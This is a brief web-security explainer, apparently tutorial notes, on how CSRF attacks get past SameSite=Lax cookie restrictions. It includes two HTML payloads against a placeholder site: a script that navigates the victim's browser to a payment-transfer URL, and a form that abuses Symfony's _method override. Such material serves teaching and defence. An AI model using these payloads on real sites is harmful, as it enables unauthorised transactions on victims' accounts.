If SameSite is set to `Lax` restrictions, either explicitly or by default browser behavior, an attacker can still perform a CSRF attack by eliciting a `GET` request from the victim's browser.

As long as the request involves a top-level navigation (TLD), the browser will still include the victim's session cookie. The following is one of the simplest payload for such an attack:
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes, for example:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```